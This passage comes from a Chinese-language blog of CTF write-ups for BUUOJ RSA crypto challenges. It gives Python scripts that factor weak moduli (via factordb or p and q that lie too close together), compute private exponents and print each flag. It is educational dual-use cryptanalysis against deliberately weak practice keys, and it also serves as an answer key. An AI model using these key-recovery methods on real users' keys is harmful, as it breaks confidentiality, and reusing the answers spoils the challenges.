<span class="token operator">=</span> <span class="token number">0xe6b1bee47bd63f615c7d0a43c529d219</span>d <span class="token operator">=</span> <span class="token number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span>enc_flag <span class="token operator">=</span> <span class="token number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span>n <span class="token operator">=</span> p1q1 <span class="token operator">-</span> pq <span class="token operator">-</span> <span class="token number">1</span>ans <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>enc_flag<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'flag&#123;cc7490e-78ab-11e9-b422-8ba97e5da1fd&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;cc7490e-78ab-11e9-b422-8ba97e5da1fd&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-RSA基础-ACTF新生赛2020-crypto-rsa0"><a href="#3-RSA基础-ACTF新生赛2020-crypto-rsa0" class="headerlink" title="3.RSA基础-[ACTF新生赛2020]crypto-rsa0"></a>3.RSA基础-[ACTF新生赛2020]crypto-rsa0</h2><p>先解个zip的伪加密，有点misc的感觉了</p><p><img src="/2020/11/25/BUUOJ-crypto/image-20210504173811552.png" alt="image-20210504173811552"></p><p>09改成00就OK了，后面就是正常的rsa了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> random<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token comment"># FLAG = 'test'  # hidden, please solve it</span><span class="token comment"># flag = int.from_bytes(FLAG, byteorder='big')</span><span class="token comment"># flag = 123</span><span class="token triple-quoted-string string">"""p=getPrime(512)q=getPrime(512)print(p)print(q)"""</span>enc <span class="token operator">=</span> <span class="token number">50996206925961019415256003394743594106061473865032792073035954925875056079762626648452348856255575840166640519334862690063949316515750256545937498213476286637455803452890781264446030732369871044870359838568618176586206041055000297981733272816089806014400846392307742065559331874972274844992047849472203390350</span>p <span class="token operator">=</span> <span class="token number">9018588066434206377240277162476739271386240173088676526295315163990968347022922841299128274551482926490908399237153883494964743436193853978459947060210411</span>q <span class="token operator">=</span> <span class="token number">7547005673877738257835729760037765213340036696350766324229143613179932145122130685778504062410137043635958208805698698169847293520149572605026492751740223</span>N <span class="token operator">=</span> p <span class="token operator">*</span> qe <span class="token operator">=</span> <span class="token number">65537</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>enc<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>ci <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ci<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""enc = pow(flag, e, N)print(enc)"""</span><span class="token triple-quoted-string string">"""9018588066434206377240277162476739271386240173088676526295315163990968347022922841299128274551482926490908399237153883494964743436193853978459947060210411754700567387773825783572976003776521334003669635076632422914361317993214512213068577850406241013704363595820880569869816984729352014957260502649275174022350996206925961019415256003394743594106061473865032792073035954925875056079762626648452348856255575840166640519334862690063949316515750256545937498213476286637455803452890781264446030732369871044870359838568618176586206041055000297981733272816089806014400846392307742065559331874972274844992047849472203390350"""</span><span class="token comment"># b'actf&#123;n0w_y0u_see_RSA&#125;'</span><span class="token comment"># flag&#123;n0w_y0u_see_RSA&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RSA基础-AFCTF2018-你能看出这是什么加密么"><a href="#RSA基础-AFCTF2018-你能看出这是什么加密么" class="headerlink" title="RSA基础-[AFCTF2018]你能看出这是什么加密么"></a>RSA基础-[AFCTF2018]你能看出这是什么加密么</h2><p>这…一看就知道是RSA啊，感觉我号弱智，也许是18年的题的问题，那时候的题还不难也许。也可能是发展太快了，现在的技术用来解以前的难题变得简单了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token number">0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f</span>q <span class="token operator">=</span> <span class="token number">0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>c <span class="token operator">=</span> <span class="token number">0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># flag在输出内容的最后为</span><span class="token comment"># afctf&#123;R54_|5_$0_$imp13&#125;</span><span class="token comment"># flag&#123;R54_|5_$0_$imp13&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RSA基础-ACTF新生赛2020-crypto-rsa3"><a href="#RSA基础-ACTF新生赛2020-crypto-rsa3" class="headerlink" title="RSA基础-[ACTF新生赛2020]crypto-rsa3"></a>RSA基础-[ACTF新生赛2020]crypto-rsa3</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token triple-quoted-string string">"""e = 65537p = getPrime(512)q = int(gmpy2.next_prime(p))n = p * qm = bytes_to_long(FLAG)c = pow(m, e, n)print(n)print(c)"""</span><span class="token comment"># 可以自己写算法解，但没必要，直接上工具网站求p即可</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">177606504836499246970959030226871608885969321778211051080524634084516973331441644993898029573612290095853069264036530459253652875586267946877831055147546910227100566496658148381834683037366134553848011903251252726474047661274223137727688689535823533046778793131902143444408735610821167838717488859902242863683</span>c <span class="token operator">=</span> <span class="token number">1457390378511382354771000540945361168984775052693073641682375071407490851289703070905749525830483035988737117653971428424612332020925926617395558868160380601912498299922825914229510166957910451841730028919883807634489834128830801407228447221775264711349928156290102782374379406719292116047581560530382210049</span>p <span class="token operator">=</span> <span class="token number">13326909050357447643526585836833969378078147057723054701432842192988717649385731430095055622303549577233495793715580004801634268505725255565021519817179231</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'actf&#123;p_and_q_should_not_be_so_close_in_value&#125;'</span><span class="token comment"># flag&#123;p_and_q_should_not_be_so_close_in_value&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RSA基础-BJDCTF2020-easyrsa"><a href="#RSA基础-BJDCTF2020-easyrsa" class="headerlink" title="RSA基础-[BJDCTF2020]easyrsa"></a>RSA基础-[BJDCTF2020]easyrsa</h2><p>有个不是特别麻烦的算法，不分析了，直接在线解了n</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> bytes_to_long<span class="token keyword">from</span> sympy <span class="token keyword">import</span> Derivative<span class="token keyword">from</span> fractions <span class="token keyword">import</span> Fraction<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token triple-quoted-string string">"""p = getPrime(1024)q = getPrime(1024)e = 65537n = p * qz = Fraction(1, Derivative(arctan(p), p)) - Fraction(1, Derivative(arth(q), q))m = bytes_to_long(flag)c = pow(m, e, n)print(c, z, n)"""</span><span class="token triple-quoted-string string">'''output:79225478668577614598074915026542162830127761777895115493506729581018102813484022840983101477965494306892538035109948774201355372685494106526544796208586913241103671820256487884070415999430913862275431821577462029470995723896760843927064060843076570001046656966544091550063132039572928857437917151987819742055786547921231915849576652932083904537483691823331528098823124533597061478081989229167627737217266815889771038774541190437448891645293831880774991949329096439186966468769073273647513809531825178831345918108008489717191848087136943429854581030066760134519122210802527359489936926748993998260848486221458154610353211574867762320966747162287218527507025792476601502007280526735983905939328431659588293337228973212727407643458751933330014247301034469480388516855754880120249593322621543776332928024211355652449845755956287290081160205694442396740377762330696188075761324632872961664303262896407293127208586692804597379937471184682515778105696516417850523252424580917923560757156717422882256169788864596855934360837533198809715714526435762673814164655635350099492411587574819831803629689860409700093827219590305673356588015054027536923963779397592332959871600335030825932143675257929100035556043154222969975995514115291470836249448215310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441'''</span>n <span class="token operator">=</span> <span class="token number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span>p <span class="token operator">=</span> <span class="token number">105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pc <span class="token operator">=</span> <span class="token number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span>e <span class="token operator">=</span> <span class="token number">65537</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'BJD&#123;Advanced_mathematics_is_too_hard!!!&#125;'</span><span class="token comment"># flag&#123;Advanced_mathematics_is_too_hard!!!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RSA文件分解公钥信息-AFCTF2018-可怜的RSA"><a href="#RSA文件分解公钥信息-AFCTF2018-可怜的RSA" class="headerlink" title="RSA文件分解公钥信息-[AFCTF2018]可怜的RSA"></a>RSA文件分解公钥信息-[AFCTF2018]可怜的RSA</h2><p>对文件内容解密需用到最下面的东西，具体原因没深想。。。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP<span class="token keyword">import</span> factordb<span class="token punctuation">.</span>factordb <span class="token keyword">as</span> factor<span class="token keyword">import</span> base64<span class="token keyword">import</span> gmpy2f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"public.key"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>pub <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>f<span class="token punctuation">)</span>n<span class="token punctuation">,</span> e <span class="token operator">=</span> pub<span class="token punctuation">.</span>n<span class="token punctuation">,</span> pub<span class="token punctuation">.</span>eresponse <span class="token operator">=</span> factor<span class="token punctuation">.</span>FactorDB<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">,</span> q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token string">'factors'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token string">'factors'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""似乎要用下面封装好的对flag.enc文件内容进行解密，具体原因尚待考究。"""</span>key_info <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>key_info<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>c <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>f<span class="token punctuation">)</span>flag <span class="token operator">=</span> key<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'afctf&#123;R54_|5_$0_B0rin9&#125;'</span><span class="token comment"># flag&#123;R54_|5_$0_B0rin9&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RSA大整数分解-RoarCTF2019-RSA"><a href="#RSA大整数分解-RoarCTF2019-RSA" class="headerlink" title="RSA大整数分解-[RoarCTF2019]RSA"></a>RSA大整数分解-[RoarCTF2019]RSA</h2><p>本来是需要进行解方程计算x，y应该也许，但是那个z也不知道干啥出来的，所以我选择在线分解</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token triple-quoted-string string">"""A = (((y % x) ** 5) % (x % y)) ** 2019 + y ** 316 + (y + 1) / xp = next_prime(z * x * y)q = next_prime(z)A = 2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724"""</span>n <span class="token operator">=</span> <span class="token number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span>c <span class="token operator">=</span> <span class="token number">41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span>p <span class="token operator">=</span> <span class="token number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">65537</span>  <span class="token comment"># 猜测，因为一般出的都是e=65537的</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># RoarCTF&#123;wm-l1l1ll1l1l1l111ll&#125;</span><span class="token comment"># flag&#123;wm-l1l1ll1l1l1l111ll&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-RSA大整数分解-rsa2"><a href="#4-RSA大整数分解-rsa2" class="headerlink" title="4.RSA大整数分解-rsa2"></a>4.RSA大整数分解-rsa2</h2><p>给出了大整数N，直接上factordb求p、q，求出</p><pre class="line-numbers language-整数分解结果" data-language="整数分解结果"><code class="language-整数分解结果">p&#x3D;11273732364123571293429600400343309403733952146912318879993851141423284675797325272321856863528776914709992821287788339848962916204774010644058033316303937q&#x3D;9046853915223503351787031888977627106934564043204783593118678181991596316582877057556463152579621699010610569526573031954779520781448550677767565207407183<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/25/BUUOJ-crypto/image-20210503145409154.png" alt="image-20210503145409154"></p><p>这个在线的分解，首先要点进后面两个链接，然后点击有一个show的选项，就能看到分解后的p、q了。</p><p>然后求出私钥<code>d</code>，下面就是，注释掉的内容是尝试可以使用python的factordb库进行整数分解，也可以用yafu工具进行，不过一般没有必要，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> factordb<span class="token punctuation">.</span>factordb <span class="token keyword">import</span> FactorDBN <span class="token operator">=</span> <span class="token number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span>e <span class="token operator">=</span> <span class="token number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span>p <span class="token operator">=</span> <span class="token number">11273732364123571293429600400343309403733952146912318879993851141423284675797325272321856863528776914709992821287788339848962916204774010644058033316303937</span>q <span class="token operator">=</span> <span class="token number">9046853915223503351787031888977627106934564043204783593118678181991596316582877057556463152579621699010610569526573031954779520781448550677767565207407183</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>phi<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""res = FactorDB(N).connect().json()factors = res['factors']p, q = map(int, (factors[0][0], factors[1][0]))phi = (p-1) * (q-1)print(phi)"""</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token comment"># d = 8920758995414587152829426558580025657357328745839747693739591820283538307445</span><span class="token comment"># flag = "flag&#123;" + hashlib.md5(hex(d)).hexdigest() + "&#125;"</span><span class="token comment"># print(flag)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求出d为<code>8920758995414587152829426558580025657357328745839747693739591820283538307445</code></p><p>然后就是这个是我用python38解的，但是题给的代码明显是用python2进行的，所以用了在线的环境解了</p><p><img src="/2020/11/25/BUUOJ-crypto/image-20210503152406168.png" alt="image-20210503152406168"></p><p>在线工具的地址为<a href="https://code.y444.cn/python">代码在线运行</a>，非常地好用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">import</span> sys<span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> io    sys<span class="token punctuation">.</span>stdout <span class="token operator">=</span> io<span class="token punctuation">.</span>TextIOWrapper<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment"># 